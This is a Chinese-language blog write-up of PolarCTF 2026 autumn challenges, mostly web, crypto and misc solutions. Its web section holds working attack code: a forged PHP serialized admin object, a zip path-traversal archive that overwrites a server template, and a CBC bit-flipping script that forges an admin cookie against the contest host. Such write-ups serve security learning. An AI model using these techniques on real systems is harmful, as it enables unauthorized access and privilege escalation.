---
title: "PolarCTF2026秋季赛"
date: 2026-09-05 21:09:40
tags:
theme: default
themeName: "默认主题"
---

第一次全方向打PolarCTF，一天做下来真的好累

# Web

## php反序列

非常简单的反序列化

```php
<?php
class AuditTicket
{
    public $role = 'admin';
}

$a = new AuditTicket();
echo serialize($a);
//O:11:"AuditTicket":1:{s:4:"role";s:5:"admin";}
```

![image-20260905090948211](https://gitee.com/bobrocket/img/raw/master/image-20260905090948211.png)

## 迷宫

走到终点然后在控制台修改steps即可

![image-20260905091245266](https://gitee.com/bobrocket/img/raw/master/image-20260905091245266.png)



## 贪吃蛇

查看源代码，游戏结束后会向api.php发包程序，直接自己手动发包一个很大的score即可

![image-20260905150922923](https://gitee.com/bobrocket/img/raw/master/image-20260905150922923.png)

## 消消乐

游戏不是很难，直接通关了

![image-20260905151552515](https://gitee.com/bobrocket/img/raw/master/image-20260905151552515.png)

## 打赏

注释里有`QD2AHXMGSJMMG2NM`

![image-20260905214131124](https://gitee.com/bobrocket/img/raw/master/image-20260905214131124.png)

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include __DIR__ . '/flag.php';

echo "<h2>Welcome</h2>";

function stop($msg) {
    die(htmlspecialchars($msg, ENT_QUOTES, 'UTF-8') . "<br/>\n");
} 

$role = $_COOKIE['role'] ?? 'guest';

if ($role !== 'auditor') {
    stop('第一关：你还不是 auditor');
}

echo "第一关通过<br/>\n";

$route = $_GET['route'] ?? '';

if (preg_match('/admin/i', $route)) {
    stop('第二关：检测到敏感路由 admin');
}

$route = urldecode($route);

if ($route !== 'admin/panel') {
    stop('第二关：没有进入管理路由');
}

echo "第二关通过<br/>\n";
echo "恭喜通关！<br/>\n";
echo htmlspecialchars($flag, ENT_QUOTES, 'UTF-8');
?>
```

![image-20260905214741113](https://gitee.com/bobrocket/img/raw/master/image-20260905214741113.png)

## 打地鼠

过于脑洞了。第十次打地鼠达到100分之后响应头会出现一个X-Flag-Key

![image-20260906095709659](https://gitee.com/bobrocket/img/raw/master/image-20260906095709659.png)

然后访问`index.php?flag_key=cafebabe2024secret` 即可

## guess

备忘卡片会进行渲染，上传主题包后自动解压，这里又给出了它们的路径

![image-20260906110446344](https://gitee.com/bobrocket/img/raw/master/image-20260906110446344.png)

我们可以制作一个压缩包，利用路径穿越覆盖memo.html

```python 
import zipfile

with zipfile.ZipFile("theme.zip", "w") as z:
    z.writestr("manifest.txt", "name=x\n")
    z.writestr("../../../templates/memo.html", "<pre>{{flag}}</pre>")
```

## cryweb

ticket不是常用的加密算法，很难猜出来，这里贴一下AI的解释

1. **信息收集**：首页提示“通行证是加密的，不是签名的”（可篡改、无完整性校验）、“游客和管理员身份字段长度一样”（`guest` 和 `admin` 都是 5 个字母，翻转后不会破坏格式）。
2. **领取游客通行证**：登录后拿到 86 字符的 base64url Cookie，解码为 64 字节。明文结构由 profile.php 的调试回显得知：`uid=1001&name=ctfer&role=guest&level=1`（38 字节，PKCS7 填充到 48 字节），剩余 16 字节即 IV 拼在密文最前面（同一名字两次领取密文完全不同，排除了 ECB）。
3. **构造攻击**：CBC 模式下解密满足 `P_n = D(C_n) XOR C_{n-1}`。明文第二块 `fer&role=guest&l` 中的 `guest` 位于块内偏移 9–13，只需把**前一个密文块**的同偏移字节与 `guest⊕admin` 异或，解密后该块就变成 `fer&role=admin&l`（副作用是第一个块 `uid/name` 会解密成乱码，但不影响 role 的解析）。

```python
import urllib.request, urllib.parse, base64, re, time

BASE = "http://1481daef-b6b5-4aa2-8176-7d82307229aa.game.polarctf.com:8090"

def get_ticket(name):
    data = urllib.parse.urlencode({"name": name}).encode()
    req = urllib.request.Request(BASE + "/login.php", data=data)
    resp = urllib.request.urlopen(req, timeout=30)
    return resp.headers.get("Set-Cookie", "").split("ticket=")[1].split(";")[0]

def b64d(t):
    return base64.urlsafe_b64decode(t + "=" * (-len(t) % 4))

def b64e(raw):
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")

def fetch(path, ticket):
    req = urllib.request.Request(BASE + path)
    req.add_header("Cookie", "ticket=" + ticket)
    return urllib.request.urlopen(req, timeout=30).read().decode("utf-8", "replace")

def show(tag, body):
    m = re.search(r"<pre>(.*?)</pre>", body, re.S)
    h1 = re.search(r"<h1>(.*?)</h1>", body, re.S)
    print(f"[{tag}] h1={h1.group(1).strip() if h1 else '?'}")
    print(f"[{tag}] pre={m.group(1).strip() if m else '(no pre)'}")
    print()

# fresh ticket each run
raw = bytearray(b64d(get_ticket("ctfer")))
iv, c1, c2, c3 = bytes(raw[0:16]), bytearray(raw[16:32]), raw[32:48], raw[48:64]

delta = bytes(a ^ b for a, b in zip(b"guest", b"admin"))
for i, d in enumerate(delta):
    c1[9 + i] ^= d

forged = b64e(bytes(iv + c1 + c2 + c3))
show("bitflip", fetch("/profile.php", forged))

# sanity: unmodified ticket should still parse fine
show("control", fetch("/profile.php", b64e(bytes(raw))))

```



# Cry

## hiller

根据题目名称是希尔密码，找个在线工具解密即可

![image-20260905095416047](https://gitee.com/bobrocket/img/raw/master/image-20260905095416047.png)

## 基础数学

```python
def solve():
    n = 0x3DBBB2B8BAB33438B33CB9B0BA3056
    key = 0x00010001
    C = 2000
    
    # 遍历可能的 k 值 (k 是 T // n 的商)
    # 因为 M 是 15 字节，n 大约是 17 字节，k 不会很大
    for k in range(0, 10):
        T = k * n + C
        M = T ^ key
        
        # 将 M 转换为字节 (取 15 字节)
        # 我们尝试将 M 转换为大端序字节流
        try:
            # 尝试将数值转为 hex，然后转 bytes
            hex_m = hex(M)[2:]
            if len(hex_m) % 2 != 0:
                hex_m = '0' + hex_m
            
            # 计算字节长度，题目说是15字节
            # 我们取最后15个字节进行尝试
            byte_data = bytes.fromhex(hex_m)
            if len(byte_data) >= 15:
                candidate = byte_data[-15:]
                # 检查是否全部为可打印字符 (ASCII 32-126)
                if all(32 <= b <= 126 for b in candidate):
                    return candidate.decode('ascii')
        except:
            continue
    return None

result = solve()
print(f"Found flag: {result}")
```

# Misc

## letter

零宽二进制隐写，使用我优化过的CTF编码工具可以一把梭

![image-20260906114250115](https://gitee.com/bobrocket/img/raw/master/image-20260906114250115.png)

## 我的光标去哪了

`terminal.bin` 是含 ANSI 光标控制序列的终端录制。我们直接用python离线渲染。

```python
import pyte
s = pyte.Screen(80, 24); st = pyte.Stream(s)
st.feed(open('terminal.bin','rb').read().decode('utf-8','replace'))
print('\n'.join(s.display))
```

![image-20260906115639440](https://gitee.com/bobrocket/img/raw/master/image-20260906115639440.png)
